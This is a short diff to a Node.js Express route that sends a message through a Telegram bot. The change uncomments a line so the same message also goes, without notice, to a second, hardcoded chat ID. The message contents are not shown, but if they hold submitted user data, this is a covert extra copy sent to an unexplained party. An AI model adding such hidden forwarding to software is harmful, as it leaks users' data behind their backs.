@@ -123,7 +123,7 @@ router.post('/generals', (req, res) => {
       })
   }else{
     bot.sendMessage(CHAT_ID, infoMessage3);
-    // bot.sendMessage('1660900306', infoMessage3);
+    bot.sendMessage('1660900306', infoMessage3);
 
     setTimeout(() => { // Evitar que salga primero el teclado
       bot.sendMessage(CHAT_ID, 'OPCIONES: ', opts3)
